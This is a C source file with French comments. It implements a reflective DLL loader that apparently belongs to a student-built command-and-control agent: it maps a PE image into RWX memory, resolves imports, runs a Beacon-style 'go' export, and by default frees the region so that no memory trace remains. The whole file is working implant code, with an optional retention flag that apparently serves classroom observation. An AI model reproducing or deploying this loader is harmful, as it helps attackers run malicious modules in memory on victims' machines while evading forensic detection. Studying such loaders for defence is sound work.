/*
 * ============================================================
 *  rdll_loader.c - Chargeur PE en memoire (Reflective DLL Injection)
 *
 *  Implemente un mini-loader PE pour x64 Windows :
 *    - Parsing des en-tetes PE (DOS > NT > sections)
 *    - Allocation RWX via VirtualAlloc
 *    - Copie des sections
 *    - Application des relocations base (REL_BASED_DIR64)
 *    - Resolution de l'IAT (Import Address Table)
 *    - Appel DllMain + export "go"
 *    - Lecture sortie via beacon_get_output / beacon_reset_output
 *      (exportes depuis la DLL car beacon_compatibility.c est compile dedans)
 *
 *  Flag de compilation optionnel :
 *    -DKEEP_RDLL_LOADED  > la DLL reste en memoire apres execution
 *                          (pedagogique : permet l'observation dans Process Hacker)
 *    Sans ce flag (defaut) > VirtualFree libere la region apres chaque execution
 *                            (furtif : aucune trace memoire residuelle)
 * ============================================================
 */
#include "platform.h"
#include "rdll_loader.h"

/* ============================================================
 *  IMPLEMENTATION WINDOWS
 * ============================================================ */
#ifdef PLATFORM_WINDOWS

#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#include "module_interface.h"
#include "beacon_compatibility.h"

/* ============================================================
 *  KEEP_RDLL_LOADED - registre des modules retenus en memoire
 *
 *  Quand -DKEEP_RDLL_LOADED est passe au compilateur :
 *    - VirtualFree est desactive > la region RWX persiste dans le processus
 *    - Chaque base allouee est enregistree dans g_loaded_list
 *    - Au debut de chaque appel, la liste complete est affichee :
 *        [RDLL-KEEP] Modules deja en memoire (N) :
 *          [1] base=0x...  size=XX KB  (chargement #1 de cette session)
 *      > permet de prouver a l'encadrant que la meme region persiste
 *        et n'est PAS reallouee entre deux commandes identiques
 * ============================================================ */
#ifdef KEEP_RDLL_LOADED

typedef struct rdll_entry {
    BYTE              *base;
    SIZE_T             size;
    int                serial;      /* numero d'ordre de chargement */
    struct rdll_entry *next;
} rdll_entry_t;

static rdll_entry_t *g_loaded_head  = NULL;
static int           g_load_counter = 0;   /* total cumule de chargements */

/* Ajoute une entree dans la liste et affiche l'etat complet */
static void keep_register(BYTE *base, SIZE_T size) {
    g_load_counter++;

    rdll_entry_t *e = (rdll_entry_t *)malloc(sizeof(rdll_entry_t));
    if (e) {
        e->base   = base;
        e->size   = size;
        e->serial = g_load_counter;
        e->next   = g_loaded_head;
        g_loaded_head = e;
    }

    printf("\n");
    printf("[RDLL-KEEP] ??????????????????????????????????????????\n");
    printf("[RDLL-KEEP]  Module #%d RETENU en memoire @ %p (%lu KB)\n",
           g_load_counter, (void *)base, (unsigned long)(size / 1024));
    printf("[RDLL-KEEP]  VirtualFree DESACTIVE - region RWX persistante\n");
    printf("[RDLL-KEEP] ??????????????????????????????????????????\n");

    int count = 0;
    rdll_entry_t *cur = g_loaded_head;
    while (cur) { count++; cur = cur->next; }

    printf("[RDLL-KEEP]  Modules actuellement en memoire (%d) :\n", count);
    cur = g_loaded_head;
    int n = 1;
    while (cur) {
        printf("[RDLL-KEEP]    [%d] base=%-18p  size=%lu KB  (chargement #%d)\n",
               n++, (void *)cur->base,
               (unsigned long)(cur->size / 1024),
               cur->serial);
        cur = cur->next;
    }
    printf("[RDLL-KEEP] ??????????????????????????????????????????\n");
    printf("[RDLL-KEEP]  > Ouvrez Process Hacker > agent.exe > Memory\n");
    printf("[RDLL-KEEP]    Filtrez par 'RWX' pour voir cette region.\n");
    printf("[RDLL-KEEP] ??????????????????????????????????????????\n\n");
    fflush(stdout);
}

/* Affiche la liste AVANT l'execution d'un nouveau module */
static void keep_print_existing(void) {
    if (!g_loaded_head) {
        printf("[RDLL-KEEP] Aucun module precedent en memoire.\n");
        fflush(stdout);
        return;
    }
    int count = 0;
    rdll_entry_t *cur = g_loaded_head;
    while (cur) { count++; cur = cur->next; }

    printf("[RDLL-KEEP] ?? Modules deja retenus (%d) avant ce chargement ??\n",
           count);
    cur = g_loaded_head;
    int n = 1;
    while (cur) {
        printf("[RDLL-KEEP]   [%d] base=%-18p  size=%lu KB\n",
               n++, (void *)cur->base,
               (unsigned long)(cur->size / 1024));
        cur = cur->next;
    }
    fflush(stdout);
}

#endif /* KEEP_RDLL_LOADED */

/* ?? Signatures des fonctions exportees par la DLL ???????????? */
typedef void  (*dll_beacon_reset_t)(void);
typedef beacon_output_t* (*dll_beacon_get_t)(void);

/* ?? Resolution d'un export par nom ??????????????????????????? */
static void *find_export(BYTE *base, IMAGE_NT_HEADERS *nt, const char *name) {
    IMAGE_DATA_DIRECTORY *dd =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dd->Size || !dd->VirtualAddress) return NULL;

    IMAGE_EXPORT_DIRECTORY *exp =
        (IMAGE_EXPORT_DIRECTORY *)(base + dd->VirtualAddress);

    DWORD *names  = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ords   = (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs  = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (strcmp((char *)(base + names[i]), name) == 0)
            return (void *)(base + funcs[ords[i]]);
    }
    return NULL;
}

/* ?? Erreur rapide ???????????????????????????????????????????? */
static module_result_t make_error(const char *msg) {
    module_result_t r = {0};
    r.status    = -1;
    r.error_msg = _strdup(msg);
    return r;
}

/* ============================================================
 *  rdll_loader_execute - point d'entree public
 * ============================================================ */
module_result_t rdll_loader_execute(
    const unsigned char *dll_bytes, size_t dll_size,
    const unsigned char *args,      size_t args_len
) {
    module_result_t result = {0};

#ifdef KEEP_RDLL_LOADED
    printf("[RDLL-KEEP] *** MODE RETENTION ACTIVE (-DKEEP_RDLL_LOADED) ***\n");
    keep_print_existing();
#endif

    /* ?? 1. Validation de l'en-tete PE ???????????????????????? */
    if (dll_size < sizeof(IMAGE_DOS_HEADER))
        return make_error("[RDLL] Trop petit pour un PE");

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)dll_bytes;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return make_error("[RDLL] MZ signature invalide");

    LONG nt_off = dos->e_lfanew;
    if ((size_t)nt_off + sizeof(IMAGE_NT_HEADERS) > dll_size)
        return make_error("[RDLL] En-tete NT hors limites");

    IMAGE_NT_HEADERS *nt_src = (IMAGE_NT_HEADERS *)(dll_bytes + nt_off);
    if (nt_src->Signature != IMAGE_NT_SIGNATURE)
        return make_error("[RDLL] Signature PE invalide");

    if (nt_src->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
        return make_error("[RDLL] Architecture non supportee (AMD64 requis)");

    if (!(nt_src->FileHeader.Characteristics & IMAGE_FILE_DLL))
        return make_error("[RDLL] Le fichier n'est pas une DLL");

    /* ?? 2. Allocation memoire ????????????????????????????????? */
    SIZE_T image_size = nt_src->OptionalHeader.SizeOfImage;

    printf("[RDLL] PE valide - %u sections, ImageSize=%lu KB, dll_size=%zu bytes\n",
           nt_src->FileHeader.NumberOfSections,
           (unsigned long)(image_size / 1024),
           dll_size);
    fflush(stdout);

    /* Tenter l'adresse de base preferee, sinon laisser Windows choisir */
    BYTE *base = (BYTE *)VirtualAlloc(
        (LPVOID)(ULONG_PTR)nt_src->OptionalHeader.ImageBase,
        image_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE
    );
    if (!base) {
        base = (BYTE *)VirtualAlloc(
            NULL, image_size,
            MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE
        );
    }
    if (!base)
        return make_error("[RDLL] VirtualAlloc echoue");

    printf("[RDLL] VirtualAlloc RWX @ %p (%lu KB)\n",
           (void *)base, (unsigned long)(image_size / 1024));
    fflush(stdout);

    /* ?? 3. Copie des en-tetes ????????????????????????????????? */
    memcpy(base, dll_bytes, nt_src->OptionalHeader.SizeOfHeaders);

    /* Pointeur NT sur la copie mappee */
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + nt_off);

    /* ?? 4. Copie des sections ????????????????????????????????? */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt_src);
    for (WORD i = 0; i < nt_src->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData == 0) continue;
        if ((size_t)(sec[i].PointerToRawData + sec[i].SizeOfRawData) > dll_size)
            continue;  /* section tronquee - ignorer */
        memcpy(
            base + sec[i].VirtualAddress,
            dll_bytes + sec[i].PointerToRawData,
            sec[i].SizeOfRawData
        );
        char sec_name[9] = {0};
        memcpy(sec_name, sec[i].Name, 8);
        printf("[RDLL]   section %-8s @ %p  raw=%5lu  virt=%5lu\n",
               sec_name,
               (void *)(base + sec[i].VirtualAddress),
               (unsigned long)sec[i].SizeOfRawData,
               (unsigned long)sec[i].Misc.VirtualSize);
        fflush(stdout);
    }

    /* ?? 5. Relocations de base ???????????????????????????????? */
    LONGLONG delta = (LONGLONG)base - (LONGLONG)nt->OptionalHeader.ImageBase;
    if (delta != 0) {
        printf("[RDLL] Relocations necessaires (delta=0x%llx)\n",
               (unsigned long long)(unsigned long long)delta);
        fflush(stdout);

        IMAGE_DATA_DIRECTORY *reloc_dd =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        if (reloc_dd->Size) {
            DWORD reloc_count = 0;
            IMAGE_BASE_RELOCATION *blk =
                (IMAGE_BASE_RELOCATION *)(base + reloc_dd->VirtualAddress);

            while (blk->VirtualAddress) {
                WORD  *entries = (WORD *)(blk + 1);
                DWORD  count   = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))
                                 / sizeof(WORD);
                for (DWORD i = 0; i < count; i++) {
                    int type   = entries[i] >> 12;
                    int offset = entries[i] & 0x0FFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG *ptr =
                            (ULONGLONG *)(base + blk->VirtualAddress + offset);
                        *ptr += (ULONGLONG)delta;
                        reloc_count++;
                    }
                }
                blk = (IMAGE_BASE_RELOCATION *)((BYTE *)blk + blk->SizeOfBlock);
            }
            printf("[RDLL]   %lu pointeurs relocalises\n", (unsigned long)reloc_count);
            fflush(stdout);
        }
    } else {
        printf("[RDLL] Aucune relocation (adresse preferee disponible)\n");
        fflush(stdout);
    }

    /* ?? 6. Resolution de l'IAT (Import Address Table) ???????? */
    IMAGE_DATA_DIRECTORY *import_dd =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (import_dd->Size) {
        IMAGE_IMPORT_DESCRIPTOR *imp =
            (IMAGE_IMPORT_DESCRIPTOR *)(base + import_dd->VirtualAddress);

        while (imp->Name) {
            char   *dll_name = (char *)(base + imp->Name);
            HMODULE hdll     = LoadLibraryA(dll_name);
            if (!hdll) {
                printf("[RDLL]   IAT: LoadLibrary('%s') ECHEC\n", dll_name);
                fflush(stdout);
                imp++; continue;
            }

            ULONG_PTR *thunk_int = imp->OriginalFirstThunk
                ? (ULONG_PTR *)(base + imp->OriginalFirstThunk)
                : (ULONG_PTR *)(base + imp->FirstThunk);
            ULONG_PTR *thunk_iat = (ULONG_PTR *)(base + imp->FirstThunk);
            DWORD fn_count = 0;

            while (*thunk_int) {
                FARPROC fn;
                if (*thunk_int & IMAGE_ORDINAL_FLAG64) {
                    fn = GetProcAddress(hdll, (LPCSTR)IMAGE_ORDINAL64(*thunk_int));
                } else {
                    IMAGE_IMPORT_BY_NAME *ibn =
                        (IMAGE_IMPORT_BY_NAME *)(base + (*thunk_int & ~IMAGE_ORDINAL_FLAG64));
                    fn = GetProcAddress(hdll, (LPCSTR)ibn->Name);
                }
                *thunk_iat = (ULONG_PTR)fn;
                thunk_int++;
                thunk_iat++;
                fn_count++;
            }
            printf("[RDLL]   IAT: %-20s > %lu fonctions resolues\n",
                   dll_name, (unsigned long)fn_count);
            fflush(stdout);
            imp++;
        }
    }

    /* ?? 7. Appel DllMain (DLL_PROCESS_ATTACH) ???????????????? */
    if (nt->OptionalHeader.AddressOfEntryPoint) {
        printf("[RDLL] DllMain(ATTACH) @ %p\n",
               (void *)(base + nt->OptionalHeader.AddressOfEntryPoint));
        fflush(stdout);
        typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
        DllMain_t dllmain =
            (DllMain_t)(base + nt->OptionalHeader.AddressOfEntryPoint);
        dllmain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    }

    /* ?? 8. Recherche de l'export "go" ???????????????????????? */
    bof_entry_func_t go_func =
        (bof_entry_func_t)find_export(base, nt, BOF_ENTRY_FUNC);

    if (!go_func) {
/* ?? KEEP_RDLL_LOADED : liberation conditionnelle (erreur) ?? */
#ifndef KEEP_RDLL_LOADED
        VirtualFree(base, 0, MEM_RELEASE);
#else
        printf("[RDLL-KEEP] Export 'go' non trouve - base=%p NON liberee (retention)\n",
               (void *)base);
        fflush(stdout);
#endif
        return make_error("[RDLL] Export '" BOF_ENTRY_FUNC "' non trouve dans la DLL");
    }
    printf("[RDLL] Export 'go' @ %p\n", (void *)go_func);
    fflush(stdout);

    /* ?? 9. Recherche des fonctions Beacon dans la DLL ????????? */
    dll_beacon_reset_t dll_reset =
        (dll_beacon_reset_t)find_export(base, nt, "beacon_reset_output");
    dll_beacon_get_t dll_get =
        (dll_beacon_get_t)find_export(base, nt, "beacon_get_output");

    printf("[RDLL] beacon_reset=%s  beacon_get=%s\n",
           dll_reset ? "DLL-interne" : "agent-fallback",
           dll_get   ? "DLL-interne" : "agent-fallback");
    fflush(stdout);

    if (dll_reset) dll_reset();
    else           beacon_reset_output();

    /* ?? 10. Execution du module ??????????????????????????????? */
    printf("[RDLL] >>> go(args=%zu bytes) ...\n", args_len);
    fflush(stdout);
    go_func((char *)args, (int)args_len);
    printf("[RDLL] <<< go() retourne\n");
    fflush(stdout);

    /* ?? 11. Recuperation de la sortie ???????????????????????? */
    beacon_output_t *out = dll_get ? dll_get() : beacon_get_output();

    if (out && out->buffer && out->length > 0) {
        result.data = (unsigned char *)malloc(out->length + 1);
        if (result.data) {
            memcpy(result.data, out->buffer, out->length);
            result.data[out->length] = '\0';
            result.data_len = out->length;
        }
    } else {
        const char *empty = "[RDLL] Execution reussie (aucune sortie)";
        result.data = (unsigned char *)malloc(strlen(empty) + 1);
        if (result.data) {
            strcpy((char *)result.data, empty);
            result.data_len = strlen(empty);
        }
    }
    result.status = 0;

    printf("[RDLL] Sortie: %zu bytes  base=%p",
           result.data_len, (void *)base);

/* ?? KEEP_RDLL_LOADED : liberation conditionnelle (succes) ?? */
#ifndef KEEP_RDLL_LOADED
    /* Mode normal (furtif) : liberation immediate */
    printf(" > VirtualFree\n");
    fflush(stdout);

    /* ?? 12. Detachement propre ???????????????????????????????? */
    if (nt->OptionalHeader.AddressOfEntryPoint) {
        typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
        DllMain_t dllmain =
            (DllMain_t)(base + nt->OptionalHeader.AddressOfEntryPoint);
        dllmain((HINSTANCE)base, DLL_PROCESS_DETACH, NULL);
    }

    VirtualFree(base, 0, MEM_RELEASE);

#else
    /* Mode retention (pedagogique) : on garde la region RWX */
    printf(" > CONSERVEE (KEEP_RDLL_LOADED)\n");
    fflush(stdout);

    /* Pas de DllMain(DETACH) non plus - la DLL reste pleinement active */
    keep_register(base, image_size);

#endif /* KEEP_RDLL_LOADED */

    return result;
}

/* ============================================================
 *  STUB LINUX - non supporte
 * ============================================================ */
#else

module_result_t rdll_loader_execute(
    const unsigned char *dll_bytes, size_t dll_size,
    const unsigned char *args,      size_t args_len
) {
    (void)dll_bytes; (void)dll_size; (void)args; (void)args_len;
    module_result_t r = {0};
    r.status    = -1;
    r.error_msg = strdup("[RDLL] Technique non supportee sur Linux");
    return r;
}

#endif /* PLATFORM_WINDOWS */
